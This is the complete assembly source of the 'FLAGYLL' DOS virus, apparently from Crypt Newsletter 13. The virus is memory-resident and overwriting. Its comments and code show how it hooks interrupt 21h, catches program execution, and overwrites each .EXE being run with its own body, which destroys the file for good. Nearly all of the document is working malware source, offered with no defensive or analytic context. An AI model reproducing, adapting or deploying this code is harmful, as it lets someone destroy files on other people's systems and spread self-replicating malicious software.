;FLAGYLL virus - edited for Crypt Newsletter 13               
;FLAGYLL is a memory resident, overwriting virus which
;infects and destroys .EXE files on load.
;It updates the infected files time/date stamps to the time of
;infection so it can easily be followed.
;.EXE's infected by FLAGYLL are destroyed.  DOS will either
;refuse to load them or FLAGYLL will become resident
;as they execute.  These programs are ruined and can only
;be deleted.
	       
	       .radix 16
     cseg       segment
		model  small
		assume cs:cseg, ds:cseg, es:cseg

		org 100h

oi21            equ endflagyll
filelength      equ endflagyll - begin
nameptr         equ endflagyll+4
DTA             equ endflagyll+8

	 




	      
begin:          jmp     install_flagyll                              

	      

						 ; install
install_flagyll:  
		
		mov     ax,cs                    ; reduce memory size     
		dec     ax                           
		mov     ds,ax                        
		cmp     byte ptr ds:[0000],5a    ; check if last memory     
		jne     cancel                   ; block     
		mov     ax,ds:[0003]                 
		sub     ax,100                   ; decrease memory     
		mov     ds:0003,ax


copy_flagyll:  
		mov     bx,ax                    ; copy to claimed block  
		mov     ax,es                    ; PSP    
		add     ax,bx                    ; virus start in memory   
		mov     es,ax
		mov     cx,offset endflagyll - begin  ; cx = length of virus                  
		mov     ax,ds                    ; restore ds   
		inc     ax
		mov     ds,ax
		lea     si,ds:[begin]            ; point to start of virus
		lea     di,es:0100               ; point to destination   
		rep     movsb                    ; copy virus in memory   
						     


hook_21:                                     
		
		mov     ds,cx                   ; hook interrupt 21h
		mov     si,0084h                ; 
		mov     di,offset oi21
		mov     dx,offset check_exec
		lodsw
		cmp     ax,dx                   ;
		je      cancel                  ; exit, if already installed
		stosw
		movsw
		
		push    es 
		pop     ds
		mov     ax,2521h                ; revector int 21h to virus
		int     21h
				     
cancel:         ret          

check_exec:                                    ; look over loaded files
		pushf                          ; for executables

		push    es                     ; push everything onto the
		push    ds                     ; stack
		push    ax
		push    bx
		push    dx

		cmp     ax,04B00h               ; is a file being 
						; executed ?
		
		
		jne     abort                   ; no, exit

do_infect:      
		call    infect                  ; then try to infect
		
abort:                                        ; restore everything
		pop     dx
		pop     bx
		pop     ax
		pop     ds
		pop     es
		popf

exit:      
					     ; exit
		jmp     dword ptr cs:[oi21]                     

infect:          
		jmp     over_id              ; it's a vanity thing

note:           db      '-=[Crypt Newsletter 13]=-'


over_id:        



		mov     cs:[name_seg],ds       ; this routine
		mov     cs:[name_off],dx       ; essentially grabs
					       ; the name of the file
		cld                             ; clear direction flags
		mov     word ptr cs:[nameptr],dx ; save pointer to the filename
		mov     word ptr cs:[nameptr+2],ds

		mov     ah,2Fh                    ; get old DTA
		int     21h
		push    es
		push    bx

		push    cs                        ; set new DTA

		pop     ds
		mov     dx,offset DTA
		mov     ah,1Ah
		int     21h

		call    host_ident              ; find filename for virus
		push    di
		mov     si,offset COM_txt       ; is extension 'COM' ?

		mov     cx,3
	 rep    cmpsb 
		pop     di
		jz      return                  ; if so, let it pass by
		mov     si,offset EXE_txt       ; is extension .EXE ?
		nop
		mov     cl,3
		rep     cmpsb
		jnz     return



do_exe:                                      ; infect host, destroying it
		
		mov     ax,4300h             ; clear attributes
		mov     ds,cs:[name_seg]
		mov     dx,cs:[name_off]
		int     21h
		and     cl,0FEh                
		mov     ax,4301h
		int     21h               
		
		mov     ds,cs:[name_seg]   ; open file read/write
		mov     dx,cs:[name_off]
		mov     ax,3D02h             
		int     21h            
		jc      close_file
		push    cs
		pop     ds
		mov     [handle],ax          
		mov     bx,ax               
		
		push    cs
		pop     ds
		mov     ax,4200h       ;set pointer to beginning of host
		
		push    cs
		pop     ds
		mov     bx,[handle]    ;handle to BX
		xor     cx,cx
		xor     dx,dx
		int     21h
		
		
		
		mov     ah,40          ;write to file
		mov     cx,filelength  ;virus length in cx    
		mov     dx,100         ;start write at beginning of Flagyll
		int     21h            ;do it
		
close_file:     mov     bx,[handle]
		mov     ah,03Eh        ;close file, name -->BX            
		int     21h
		
		mov     ax,4C00h       ;exit to DOS
		int     21h



		
return:         mov     ah,1Ah                 
		pop     dx              ; restore old DTA
		pop     ds
		int     21H

		ret                     ; let DOS regain control       


host_ident:     les     di,dword ptr cs:[nameptr]  ; finds filename for
		mov     ch,0FFh                    ; host selection
		mov     al,0
	 repnz  scasb
		sub     di,4
		ret


		

EXE_txt         db  'EXE',0      ; extension masks
COM_txt         db  'COM',0      ; for host selection

name_seg        dw  ?            ;data buffers for
name_off        dw  ?            ; viral use on the fly
handle          dw  ?

note2:           db     'Flagyll'     ; virus name

endflagyll:

cseg            ends
		end begin



